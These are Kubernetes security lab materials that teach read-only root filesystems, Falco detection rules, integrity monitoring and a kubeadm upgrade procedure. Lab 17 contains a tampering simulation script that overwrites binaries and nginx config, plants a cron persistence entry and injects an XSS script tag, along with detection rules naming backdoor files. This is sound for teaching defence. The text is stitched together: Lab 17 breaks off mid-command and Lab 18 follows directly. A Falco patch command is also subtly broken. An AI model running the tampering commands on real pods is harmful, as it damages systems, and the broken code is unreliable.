These techniques are essential for production microservice deployments and are commonly tested in the Certified Kubernetes Security Specialist (CKS) certification. The combination of these security measures provides robust protection against common container and Kubernetes security threats while maintaining operational efficiency.

Best Practices Learned: • Always use minimal base images when possible • Implement Pod Security Standards appropriate for your environment • Consider runtime sandboxing for high-security requirements • Monitor resource usage impact of security measures • Test security configurations thoroughly before production deployment






Lab 17: Immutability at Runtime Lab
Objectives

By the end of this lab, students will be able to:

• Understand the concept of runtime immutability in containerized environments • Configure and implement runtime immutability policies for containers using Kubernetes • Simulate unauthorized file system changes in running containers • Deploy and configure monitoring tools to detect runtime modifications • Set up alerting mechanisms for immutability violations • Analyze security events and respond to runtime threats • Apply best practices for maintaining container immutability in production environments
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Linux command line operations • Familiarity with Docker containers and containerization concepts • Knowledge of Kubernetes fundamentals including pods, deployments, and services • Understanding of YAML configuration files • Basic knowledge of security concepts in containerized environments • Familiarity with text editors like vim or nano
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.

Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes cluster (single-node) • Docker runtime pre-installed • kubectl command-line tool configured • Falco security monitoring tool • All necessary permissions and network configurations
Task 1: Configure Runtime Immutability Policies for Containers
Subtask 1.1: Understanding Runtime Immutability

Runtime immutability means that once a container starts running, its file system should not be modified. This security practice helps prevent: • Malware injection during runtime • Unauthorized configuration changes • Data tampering attacks • Privilege escalation attempts
Subtask 1.2: Create a Basic Application Container

First, let's create a simple web application that we'll use throughout this lab.

    Create a working directory for the lab:

mkdir ~/immutability-lab
cd ~/immutability-lab

    Create a simple HTML file for our web application:

cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Immutable Web App</title>
</head>
<body>
    <h1>Welcome to the Immutable Web Application</h1>
    <p>This application demonstrates runtime immutability concepts.</p>
    <p>Current time: <span id="time"></span></p>
    <script>
        document.getElementById('time').innerHTML = new Date().toLocaleString();
    </script>
</body>
</html>
EOF

    Create a Dockerfile for our application:

cat > Dockerfile << 'EOF'
FROM nginx:alpine
COPY index.html /usr/share/nginx/html/
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
EOF

    Build the Docker image:

docker build -t immutable-webapp:v1.0 .

Subtask 1.3: Create Kubernetes Deployment with Read-Only Root Filesystem

    Create a Kubernetes deployment with read-only root filesystem:

cat > immutable-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: immutable-webapp
  labels:
    app: immutable-webapp
spec:
  replicas: 2
  selector:
    matchLabels:
      app: immutable-webapp
  template:
    metadata:
      labels:
        app: immutable-webapp
    spec:
      containers:
      - name: webapp
        image: immutable-webapp:v1.0
        ports:
        - containerPort: 80
        securityContext:
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 101
          allowPrivilegeEscalation: false
          capabilities:
            drop:
            - ALL
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
        - name: var-cache-nginx
          mountPath: /var/cache/nginx
        - name: var-run
          mountPath: /var/run
      volumes:
      - name: tmp-volume
        emptyDir: {}
      - name: var-cache-nginx
        emptyDir: {}
      - name: var-run
        emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: immutable-webapp-service
spec:
  selector:
    app: immutable-webapp
  ports:
  - port: 80
    targetPort: 80
  type: NodePort
EOF

    Apply the deployment:

kubectl apply -f immutable-deployment.yaml

    Verify the deployment is running:

kubectl get pods -l app=immutable-webapp
kubectl get svc immutable-webapp-service

Subtask 1.4: Implement Pod Security Standards

    Create a namespace with restricted Pod Security Standards:

cat > secure-namespace.yaml << 'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: secure-apps
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
EOF

    Apply the secure namespace:

kubectl apply -f secure-namespace.yaml

    Deploy the application in the secure namespace:

kubectl apply -f immutable-deployment.yaml -n secure-apps

    Verify the deployment in the secure namespace:

kubectl get pods -n secure-apps -l app=immutable-webapp

Task 2: Simulate Unauthorized File Changes in a Running Container
Subtask 2.1: Create a Vulnerable Application for Testing

    Create a deployment without immutability controls for comparison:

cat > vulnerable-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-webapp
  labels:
    app: vulnerable-webapp
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-webapp
  template:
    metadata:
      labels:
        app: vulnerable-webapp
    spec:
      containers:
      - name: webapp
        image: immutable-webapp:v1.0
        ports:
        - containerPort: 80
        # Note: No securityContext restrictions
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-webapp-service
spec:
  selector:
    app: vulnerable-webapp
  ports:
  - port: 80
    targetPort: 80
  type: NodePort
EOF

    Deploy the vulnerable application:

kubectl apply -f vulnerable-deployment.yaml

Subtask 2.2: Attempt File Modifications in Immutable Container

    Get the pod name for the immutable application:

IMMUTABLE_POD=$(kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[0].metadata.name}')
echo "Immutable pod: $IMMUTABLE_POD"

    Try to modify files in the immutable container:

# This should fail due to read-only filesystem
kubectl exec -it $IMMUTABLE_POD -- sh -c "echo 'malicious content' > /usr/share/nginx/html/malicious.html"

    Try to modify the main HTML file:

# This should also fail
kubectl exec -it $IMMUTABLE_POD -- sh -c "echo 'HACKED!' >> /usr/share/nginx/html/index.html"

    Verify that temporary directories are still writable:

# This should succeed as /tmp is mounted as writable
kubectl exec -it $IMMUTABLE_POD -- sh -c "echo 'temp file' > /tmp/test.txt && cat /tmp/test.txt"

Subtask 2.3: Demonstrate Successful Modifications in Vulnerable Container

    Get the pod name for the vulnerable application:

VULNERABLE_POD=$(kubectl get pods -l app=vulnerable-webapp -o jsonpath='{.items[0].metadata.name}')
echo "Vulnerable pod: $VULNERABLE_POD"

    Successfully modify files in the vulnerable container:

# This will succeed
kubectl exec -it $VULNERABLE_POD -- sh -c "echo '<h2>SYSTEM COMPROMISED!</h2>' >> /usr/share/nginx/html/index.html"

    Create a malicious file:

kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'Malicious script content' > /usr/share/nginx/html/backdoor.html"

    Verify the changes:

kubectl exec -it $VULNERABLE_POD -- cat /usr/share/nginx/html/index.html
kubectl exec -it $VULNERABLE_POD -- ls -la /usr/share/nginx/html/

Subtask 2.4: Simulate Advanced Attack Scenarios

    Create a script that simulates various attack patterns:

cat > attack-simulation.sh << 'EOF'
#!/bin/bash

POD_NAME=$1
if [ -z "$POD_NAME" ]; then
    echo "Usage: $0 <pod-name>"
    exit 1
fi

echo "=== Simulating Attack Scenarios on $POD_NAME ==="

echo "1. Attempting to modify system binaries..."
kubectl exec -it $POD_NAME -- sh -c "echo 'malicious' > /bin/malicious_binary" 2>/dev/null && echo "SUCCESS: Binary modification" || echo "BLOCKED: Binary modification"

echo "2. Attempting to modify configuration files..."
kubectl exec -it $POD_NAME -- sh -c "echo 'malicious_config' > /etc/nginx/nginx.conf" 2>/dev/null && echo "SUCCESS: Config modification" || echo "BLOCKED: Config modification"

echo "3. Attempting to create persistence mechanisms..."
kubectl exec -it $POD_NAME -- sh -c "echo '*/5 * * * * /bin/malicious_script' > /etc/crontab" 2>/dev/null && echo "SUCCESS: Cron job created" || echo "BLOCKED: Cron job creation"

echo "4. Attempting to modify web content..."
kubectl exec -it $POD_NAME -- sh -c "echo '<script>alert(\"XSS\")</script>' >> /usr/share/nginx/html/index.html" 2>/dev/null && echo "SUCCESS: Web content modified" || echo "BLOCKED: Web content modification"

echo "5. Attempting to install additional software..."
kubectl exec -it $POD_NAME -- sh -c "apk add --no-cache curl" 2>/dev/null && echo "SUCCESS: Software installed" || echo "BLOCKED: Software installation"

echo "=== Attack simulation complete ==="
EOF

chmod +x attack-simulation.sh

    Run the attack simulation on both containers:

echo "Testing immutable container:"
./attack-simulation.sh $IMMUTABLE_POD

echo -e "\nTesting vulnerable container:"
./attack-simulation.sh $VULNERABLE_POD

Task 3: Use Monitoring Tools to Detect and Alert on Changes
Subtask 3.1: Install and Configure Falco for Runtime Security Monitoring

    Install Falco using Helm:

# Add the Falco Helm repository
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

    Create a custom Falco configuration:

cat > falco-values.yaml << 'EOF'
falco:
  grpc:
    enabled: true
  grpcOutput:
    enabled: true
  httpOutput:
    enabled: true
    url: "http://localhost:8080/events"
  jsonOutput: true
  jsonIncludeOutputProperty: true
  
driver:
  kind: ebpf

falcoctl:
  artifact:
    install:
      enabled: true
    follow:
      enabled: true

services:
  - name: k8saudit
    type: ClusterIP
    ports:
      - port: 9765
        targetPort: 9765
        protocol: TCP
        name: grpc
EOF

    Install Falco:

helm install falco falcosecurity/falco -f falco-values.yaml

    Verify Falco installation:

kubectl get pods -l app.kubernetes.io/name=falco
kubectl logs -l app.kubernetes.io/name=falco --tail=20

Subtask 3.2: Create Custom Falco Rules for Immutability Violations

    Create custom Falco rules for detecting immutability violations:

cat > custom-immutability-rules.yaml << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-custom-rules
  labels:
    app.kubernetes.io/name: falco
data:
  custom_rules.yaml: |
    - rule: Write below root filesystem in container
      desc: Detect attempts to write to the root filesystem in containers with read-only root
      condition: >
        spawned_process and container and
        (fd.typechar = 'f' and fd.num >= 0 and 
         (open_write or create_file) and
         not fd.name startswith "/tmp" and
         not fd.name startswith "/var/run" and
         not fd.name startswith "/var/cache" and
         not fd.name startswith "/dev" and
         not fd.name startswith "/proc" and
         not fd.name startswith "/sys")
      output: >
        Attempt to write to read-only root filesystem 
        (user=%user.name command=%proc.cmdline file=%fd.name 
         container_id=%container.id container_name=%container.name 
         image=%container.image.repository:%container.image.tag)
      priority: WARNING
      tags: [filesystem, container, immutability]

    - rule: Modify web application files
      desc: Detect modifications to web application files
      condition: >
        spawned_process and container and
        (open_write or create_file) and
        (fd.name startswith "/usr/share/nginx/html" or
         fd.name startswith "/var/www" or
         fd.name contains ".html" or
         fd.name contains ".js" or
         fd.name contains ".css")
      output: >
        Web application file modification detected 
        (user=%user.name command=%proc.cmdline file=%fd.name 
         container_id=%container.id container_name=%container.name 
         image=%container.image.repository:%container.image.tag)
      priority: ERROR
      tags: [web, application, tampering]

    - rule: Package management in container
      desc: Detect package management operations in containers
      condition: >
        spawned_process and container and
        (proc.name in (apk, apt, apt-get, yum, dnf, zypper, pip, npm, gem))
      output: >
        Package management operation in container 
        (user=%user.name command=%proc.cmdline 
         container_id=%container.id container_name=%container.name 
         image=%container.image.repository:%container.image.tag)
      priority: WARNING
      tags: [package, installation, container]

    - rule: Suspicious file creation in container
      desc: Detect creation of suspicious files in containers
      condition: >
        spawned_process and container and
        create_file and
        (fd.name contains "backdoor" or
         fd.name contains "malicious" or
         fd.name contains ".sh" and fd.directory in ("/tmp", "/var/tmp") or
         fd.name endswith ".php" and fd.directory startswith "/usr/share/nginx/html")
      output: >
        Suspicious file created in container 
        (user=%user.name command=%proc.cmdline file=%fd.name 
         container_id=%container.id container_name=%container.name 
         image=%container.image.repository:%container.image.tag)
      priority: CRITICAL
      tags: [malware, backdoor, container]
EOF

    Apply the custom rules:

kubectl apply -f custom-immutability-rules.yaml

    Update Falco to use the custom rules:

kubectl patch configmap falco -p '{"data":{"falco.yaml":"$(kubectl get configmap falco -o jsonpath='{.data.falco\.yaml}' | sed 's/rules_file:/rules_file:\n  - \/etc\/falco\/custom_rules.yaml\n  #- /g')"}}'

    Restart Falco to load the new rules:

kubectl rollout restart daemonset falco
kubectl rollout status daemonset falco

Subtask 3.3: Set Up Log Monitoring and Alerting

    Create a simple log monitoring script:

cat > monitor-falco-alerts.sh << 'EOF'
#!/bin/bash

echo "=== Starting Falco Alert Monitor ==="
echo "Monitoring for immutability violations..."
echo "Press Ctrl+C to stop monitoring"
echo ""

# Get Falco pod name
FALCO_POD=$(kubectl get pods -l app.kubernetes.io/name=falco -o jsonpath='{.items[0].metadata.name}')

if [ -z "$FALCO_POD" ]; then
    echo "Error: Falco pod not found"
    exit 1
fi

echo "Monitoring Falco pod: $FALCO_POD"
echo "----------------------------------------"

# Monitor Falco logs in real-time
kubectl logs -f $FALCO_POD | while read line; do
    # Check if the line contains our custom rules
    if echo "$line" | grep -q -E "(Write below root filesystem|Modify web application files|Package management in container|Suspicious file creation)"; then
        echo "🚨 ALERT: $line"
        echo "Time: $(date)"
        echo "----------------------------------------"
    elif echo "$line" | grep -q "Priority:"; then
        echo "📋 Event: $line"
    fi
done
EOF

chmod +x monitor-falco-alerts.sh

    Create an alert webhook simulator:

cat > alert-webhook.py << 'EOF'
#!/usr/bin/env python3
import http.server
import socketserver
import json
from datetime import datetime

class AlertHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            alert_data = json.loads(post_data.decode('utf-8'))
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            print(f"\n🚨 SECURITY ALERT RECEIVED at {timestamp}")
            print("=" * 50)
            print(f"Priority: {alert_data.get('priority', 'Unknown')}")
            print(f"Rule: {alert_data.get('rule', 'Unknown')}")
            print(f"Output: {alert_data.get('output', 'No details')}")
            print("=" * 50)
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "received"}).encode())
            
        except Exception as e:
            print(f"Error processing alert: {e}")
            self.send_response(400)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

if __name__ == "__main__":
    PORT = 8080
    print(f"Starting Alert Webhook Server on port {PORT}")
    print("Waiting for security alerts...")
    
    with socketserver.TCPServer(("", PORT), AlertHandler) as httpd:
        httpd.serve_forever()
EOF

chmod +x alert-webhook.py

Subtask 3.4: Test the Monitoring System

    Start the alert monitoring in one terminal:

# Run this in a separate terminal or background process
./monitor-falco-alerts.sh &
MONITOR_PID=$!

    Start the webhook server in another terminal:

# Run this in a separate terminal
python3 alert-webhook.py &
WEBHOOK_PID=$!

    Generate test alerts by performing suspicious activities:

echo "=== Generating Test Alerts ==="

# Test 1: Attempt to modify web content in vulnerable container
echo "Test 1: Modifying web content..."
kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'ALERT TEST' >> /usr/share/nginx/html/index.html"

sleep 5

# Test 2: Create suspicious files
echo "Test 2: Creating suspicious files..."
kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'backdoor script' > /tmp/backdoor.sh"

sleep 5

# Test 3: Attempt package installation
echo "Test 3: Attempting package installation..."
kubectl exec -it $VULNERABLE_POD -- sh -c "apk update" 2>/dev/null || true

sleep 5

# Test 4: Try to modify system files
echo "Test 4: Attempting system file modification..."
kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'malicious' > /etc/hosts" 2>/dev/null || true

echo "=== Test alerts generated ==="

    Check the monitoring output:

# Wait a moment for alerts to be processed
sleep 10

# Check recent Falco logs
kubectl logs -l app.kubernetes.io/name=falco --tail=50 | grep -E "(ALERT|Priority|Write below root|Modify web|Package management|Suspicious file)"

Subtask 3.5: Create Automated Response Scripts

    Create an automated response script:

cat > automated-response.sh << 'EOF'
#!/bin/bash

# Automated response to immutability violations
respond_to_violation() {
    local container_id=$1
    local violation_type=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] AUTOMATED RESPONSE TRIGGERED"
    echo "Container ID: $container_id"
    echo "Violation Type: $violation_type"
    
    # Log the incident
    echo "[$timestamp] SECURITY INCIDENT: $violation_type in container $container_id" >> /tmp/security-incidents.log
    
    # Get pod information
    local pod_name=$(kubectl get pods --all-namespaces -o json | jq -r ".items[] | select(.status.containerStatuses[]?.containerID | contains(\"$container_id\")) | .metadata.name" 2>/dev/null)
    
    if [ ! -z "$pod_name" ]; then
        echo "Affected Pod: $pod_name"
        
        # Option 1: Restart the pod (uncomment to enable)
        # echo "Restarting affected pod..."
        # kubectl delete pod $pod_name
        
        # Option 2: Scale down the deployment (uncomment to enable)
        # echo "Scaling down deployment..."
        # kubectl scale deployment vulnerable-webapp --replicas=0
        
        # Option 3: Add security label for quarantine
        echo "Marking pod for security review..."
        kubectl label pod $pod_name security-violation=true --overwrite
        
        # Send notification (simulate)
        echo "📧 NOTIFICATION: Security team notified about violation in $pod_name"
    fi
    
    echo "Automated response completed."
    echo "----------------------------------------"
}

# Example usage
if [ "$#" -eq 2 ]; then
    respond_to_violation "$1" "$2"
else
    echo "Usage: $0 <container_id> <violation_type>"
    echo "Example: $0 abc123 'file_modification'"
fi
EOF

chmod +x automated-response.sh

    Test the automated response:

# Simulate a response to a violation
./automated-response.sh "test-container-123" "unauthorized_file_modification"

# Check the incident log
cat /tmp/security-incidents.log

Task 4: Advanced Monitoring and Analysis
Subtask 4.1: Implement File Integrity Monitoring

    Create a file integrity monitoring script:

cat > file-integrity-monitor.sh << 'EOF'
#!/bin/bash

# File Integrity Monitoring for containers
BASELINE_DIR="/tmp/baselines"
mkdir -p $BASELINE_DIR

create_baseline() {
    local pod_name=$1
    local container_name=${2:-webapp}
    
    echo "Creating baseline for $pod_name..."
    
    # Create checksums for important files
    kubectl exec $pod_name -c $container_name -- find /usr/share/nginx/html -type f -exec sha256sum {} \; > "$BASELINE_DIR/${pod_name}_baseline.txt" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "Baseline created: $BASELINE_DIR/${pod_name}_baseline.txt"
        echo "Files monitored:"
        cat "$BASELINE_DIR/${pod_name}_baseline.txt"
    else
        echo "Failed to create baseline for $pod_name"
    fi
}

check_integrity() {
    local pod_name=$1
    local container_name=${2:-webapp}
    local baseline_file="$BASELINE_DIR/${pod_name}_baseline.txt"
    
    if [ ! -f "$baseline_file" ]; then
        echo "No baseline found for $pod_name. Creating one..."
        create_baseline $pod_name $container_name
        return
    fi
    
    echo "Checking integrity for $pod_name..."
    
    # Get current checksums
    local current_checksums=$(mktemp)
    kubectl exec $pod_name -c $container_name -- find /usr/share/nginx/html -type f -exec sha256sum {} \; > "$current_checksums" 2>/dev/null
    
    if [ $? -ne 0 ]; then
        echo "Failed to get current checksums from $pod_name"
        rm -f "$current_checksums"
        return
    fi
    
    # Compare with baseline
    local changes=$(diff "$baseline_file" "$current_checksums")
    
    if [ -z "$changes" ]; then
        echo "✅ No integrity violations detected in $pod_name"
    else
        echo "🚨 INTEGRITY VIOLATION DETECTED in $pod_name:"
        echo "$changes"
        echo ""
        echo "Detailed analysis:"
        echo "Files added/modified:"
        diff "$baseline_file" "$current_checksums" | grep "^>" | cut -d' ' -f3-
        echo "Files removed:"
        diff "$baseline_file" "$current_checksums" | grep "^<" | cut -d' ' -f3-
    fi
    
    rm -f "$current_checksums"
}

monitor_continuously() {
    local interval=${1:-30}
    echo "Starting continuous monitoring (checking every $interval seconds)..."
    echo "Press Ctrl+C to stop"
    
    while true; do
        echo "=== Integrity Check at $(date) ==="
        
        # Check all running pods with our labels
        for pod in $(kubectl get pods -l app=vulnerable-webapp -o jsonpath='{.items[*].metadata.name}'); do
            check_integrity $pod
        done
        
        for pod in $(kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].metadata.name}'); do
            check_integrity $pod
        done
        
        echo "Next check in $interval seconds..."
        sleep $interval
    done
}

case "$1" in
    "baseline")
        create_baseline $2 $3
        ;;
    "check")
        check_integrity $2 $3
        ;;
    "monitor")
        monitor_continuously $2
        ;;
    *)
        echo "Usage: $0 {baseline|check|monitor} [pod_name] [container_name]"
        echo "  baseline <pod_name> [container_name] - Create integrity baseline"
        echo "  check <pod_name> [container_name]    - Check integrity against baseline"
        echo "  monitor [interval_seconds]           - Continuously monitor all pods"
        ;;
esac
EOF

chmod +x file-integrity-monitor.sh

    Create baselines for our applications:

# Create baseline for vulnerable app
VULNERABLE_POD=$(kubectl get pods -l app=vulnerable-webapp -o jsonpath='{.items[0].metadata.name}')
./file-integrity-monitor.sh baseline $VULNERABLE_POD

# Create baseline for immutable app
IMMUTABLE_POD=$(kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[0].metadata.name}')
./file-integrity-monitor.sh baseline $IMMUTABLE_POD

    Test integrity monitoring:

# Modify files in vulnerable container
kubectl exec -it $VULNERABLE_POD -- sh -c "echo 'Modified content' >> /usr/share/nginx/html/index.html"

# Check integrity
./file-integrity-monitor.sh check $VULNERABLE_POD
./file-integrity-monitor.sh check $IMMUTABLE_POD

Subtask 4.2: Create Security Dashboard

    Create a simple security dashboard script:

cat > security-dashboard.sh << 'EOF'
#!/bin/bash

# Security Dashboard for Container Immutability
clear

show_header() {
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              CONTAINER SECURITY DASHBOARD                   ║"
    echo "║                 Immutability Monitoring                     ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
}

show_pod_status() {
    echo "📊 POD STATUS OVERVIEW"
    echo "----------------------------------------"
    
    echo "Immutable Web App Pods:"
    kubectl get pods -l app=immutable-webapp -o custom-columns="NAME:.metadata.name,STATUS:.status.phase,READY:.status.containerStatuses[0].ready,RESTARTS:.status.containerStatuses[0].restartCount" --no-headers | while read line; do
        echo "  ✓ $line"
    done
    
    echo ""
    echo "Vulnerable Web App Pods:"
    kubectl get pods -l app=vulnerable-webapp -o custom-columns="NAME:.metadata.name,STATUS:.status.phase,READY:.status.containerStatuses[0].ready,RESTARTS:.status.containerStatuses[0].restartCount" --no-headers | while read line; do
        echo "  ⚠️  $line"
    done
    echo ""
}

show_security_policies() {
    echo "🔒 SECURITY POLICY STATUS"
    echo "----------------------------------------"
    
    # Check read-only root filesystem
    echo "Read-Only Root Filesystem:"
    kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].spec.containers[*].securityContext.readOnlyRootFilesystem}' | grep -q true && echo "  ✅ Enabled" || echo "  ❌ Disabled"
    
    # Check non-root user
    echo "Non-Root User:"
    kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].spec.containers[*].securityContext.runAsNonRoot}' | grep -q true && echo "  ✅ Enabled" || echo "  ❌ Disabled"
    
    # Check privilege escalation
    echo "Privilege Escalation Prevention:"
    kubectl get pods -l app=immutable-webapp -o jsonpath='{.items[*].spec.containers[*].securityContext.allowPrivilegeEscalation}' | grep -q false && echo "  ✅ Enabled" || echo "  ❌ Disabled"
    
    echo ""
}

show_recent_alerts() {
    echo "🚨 RECENT SECURITY ALERTS (Last 10)"
    echo "----------------------------------------"
    
    # Get recent Falco alerts
    local falco_pod=$(kubectl get pods -l app.kubernetes.io/name=falco -o jsonpath='{.items[0].metadata.name}')
    if [ ! -z "$falco_pod" ]; then
        kubectl logs $falco_pod --tail=50 | grep -E "(





Lab 18: Upgrade and Patch Management Lab
Objectives

By the end of this lab, students will be able to:

• Understand the importance of Kubernetes cluster upgrade and patch management • Perform a controlled cluster upgrade using kubeadm • Apply patches to Kubernetes components without causing downtime • Validate cluster functionality after upgrade operations • Implement best practices for maintaining cluster security and stability • Troubleshoot common issues during upgrade processes
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes architecture and components • Familiarity with kubectl command-line tool • Knowledge of Linux command-line operations • Understanding of YAML configuration files • Previous experience with kubeadm cluster setup • Basic networking concepts in Kubernetes
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.

Your lab environment includes: • Ubuntu 20.04 LTS machines • Pre-installed Docker and containerd • kubeadm, kubelet, and kubectl tools • A functional 3-node Kubernetes cluster (1 control plane, 2 worker nodes)
Task 1: Prepare for Cluster Upgrade
Subtask 1.1: Verify Current Cluster Status

First, let's examine the current state of our Kubernetes cluster to understand what we're working with.

    Check cluster nodes and their versions:

kubectl get nodes -o wide

    Verify cluster component versions:

kubectl version --short

    Check the health of cluster components:

kubectl get componentstatuses

    List all pods in system namespaces:

kubectl get pods -n kube-system
kubectl get pods -n kube-public
kubectl get pods -n kube-node-lease

    Document current cluster information:

# Save current cluster info to a file for reference
kubectl cluster-info > cluster-info-before-upgrade.txt
kubectl get nodes -o yaml > nodes-before-upgrade.yaml

Subtask 1.2: Check Available Upgrade Versions

    Update package repositories:

sudo apt update

    Check available kubeadm versions:

apt list -a kubeadm | head -10

    Determine the next available version:

# Find the latest patch version for your current minor version
kubeadm version
sudo kubeadm upgrade plan

Subtask 1.3: Create Backup and Safety Measures

    Backup etcd data (run on control plane node):

# Create backup directory
sudo mkdir -p /opt/etcd-backup

# Get etcd pod information
kubectl get pod -n kube-system -l component=etcd

# Create etcd snapshot
sudo ETCDCTL_API=3 etcdctl snapshot save /opt/etcd-backup/etcd-snapshot-$(date +%Y%m%d-%H%M%S).db \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key

    Verify backup integrity:

sudo ETCDCTL_API=3 etcdctl snapshot status /opt/etcd-backup/etcd-snapshot-*.db --write-out=table

    Create configuration backups:

# Backup Kubernetes configuration files
sudo cp -r /etc/kubernetes /opt/kubernetes-config-backup-$(date +%Y%m%d)

Task 2: Perform Control Plane Upgrade
Subtask 2.1: Upgrade kubeadm on Control Plane

    Drain the control plane node:

# Replace 'control-plane-node-name' with your actual node name
kubectl drain <control-plane-node-name> --ignore-daemonsets --delete-emptydir-data

    Upgrade kubeadm package:

# Find the target version (example: 1.28.x-00)
TARGET_VERSION="1.28.2-00"

# Upgrade kubeadm
sudo apt-mark unhold kubeadm
sudo apt-get update
sudo apt-get install -y kubeadm=$TARGET_VERSION
sudo apt-mark hold kubeadm

    Verify kubeadm upgrade:

kubeadm version

Subtask 2.2: Plan and Apply Control Plane Upgrade

    Generate upgrade plan:

sudo kubeadm upgrade plan

    Apply the upgrade:

# Apply upgrade to the first control plane node
sudo kubeadm upgrade apply v1.28.2

    Monitor upgrade progress:

# Watch the upgrade process
kubectl get pods -n kube-system -w

Subtask 2.3: Upgrade kubelet and kubectl on Control Plane

    Upgrade kubelet and kubectl:

sudo apt-mark unhold kubelet kubectl
sudo apt-get update
sudo apt-get install -y kubelet=$TARGET_VERSION kubectl=$TARGET_VERSION
sudo apt-mark hold kubelet kubectl

    Restart kubelet service:

sudo systemctl daemon-reload
sudo systemctl restart kubelet

    Uncordon the control plane node:

kubectl uncordon <control-plane-node-name>

    Verify control plane upgrade:

kubectl get nodes
kubectl version --short

Task 3: Upgrade Worker Nodes
Subtask 3.1: Upgrade First Worker Node

    Drain the worker node (run from control plane):

kubectl drain <worker-node-1-name> --ignore-daemonsets --delete-emptydir-data

    SSH to the worker node and upgrade kubeadm:

# On worker node
sudo apt-mark unhold kubeadm
sudo apt-get update
sudo apt-get install -y kubeadm=$TARGET_VERSION
sudo apt-mark hold kubeadm

    Upgrade the node configuration:

# On worker node
sudo kubeadm upgrade node

    Upgrade kubelet and kubectl:

# On worker node
sudo apt-mark unhold kubelet kubectl
sudo apt-get update
sudo apt-get install -y kubelet=$TARGET_VERSION kubectl=$TARGET_VERSION
sudo apt-mark hold kubelet kubectl

    Restart kubelet:

# On worker node
sudo systemctl daemon-reload
sudo systemctl restart kubelet

    Uncordon the node (run from control plane):

kubectl uncordon <worker-node-1-name>

Subtask 3.2: Upgrade Remaining Worker Nodes

Repeat the same process for each remaining worker node:

    For each worker node, repeat the process:

# Drain node
kubectl drain <worker-node-name> --ignore-daemonsets --delete-emptydir-data

# SSH to worker node and perform upgrade steps
# (Same as Subtask 3.1 steps 2-5)

# Uncordon node
kubectl uncordon <worker-node-name>

    Verify all nodes are upgraded:

kubectl get nodes -o wide

Task 4: Apply Security Patches and Updates
Subtask 4.1: Update Container Runtime

    Check current containerd version:

containerd --version

    Update containerd (on all nodes):

sudo apt update
sudo apt upgrade containerd.io

    Restart containerd service:

sudo systemctl restart containerd
sudo systemctl status containerd

Subtask 4.2: Apply System Security Patches

    Update system packages (on all nodes):

sudo apt update
sudo apt upgrade -y

    Check for security updates:

sudo apt list --upgradable | grep -i security

    Reboot nodes if kernel updates were applied:

# Check if reboot is required
if [ -f /var/run/reboot-required ]; then
    echo "Reboot required"
    # Schedule maintenance window and reboot
    sudo reboot
fi

Subtask 4.3: Update Critical Add-ons

    Update CoreDNS:

# Check current CoreDNS version
kubectl get deployment coredns -n kube-system -o yaml | grep image:

# Update CoreDNS (if needed)
kubectl set image deployment/coredns -n kube-system coredns=k8s.gcr.io/coredns/coredns:v1.10.1

    Update kube-proxy:

# Check current kube-proxy version
kubectl get daemonset kube-proxy -n kube-system -o yaml | grep image:

# Verify kube-proxy is updated automatically with cluster upgrade
kubectl get pods -n kube-system -l k8s-app=kube-proxy

Task 5: Test Cluster Functionality Post-Upgrade
Subtask 5.1: Verify Cluster Health

    Check all nodes are ready:

kubectl get nodes
kubectl describe nodes | grep -E "Name:|Conditions:" -A 5

    Verify system pods are running:

kubectl get pods -n kube-system
kubectl get pods -n kube-system | grep -v Running

    Test cluster DNS resolution:

# Create a test pod
kubectl run test-dns --image=busybox --rm -it --restart=Never -- nslookup kubernetes.default

Subtask 5.2: Deploy Test Applications

    Create a test namespace:

kubectl create namespace upgrade-test

    Deploy a test application:

cat << EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-test
  namespace: upgrade-test
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nginx-test
  template:
    metadata:
      labels:
        app: nginx-test
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
---
apiVersion: v1
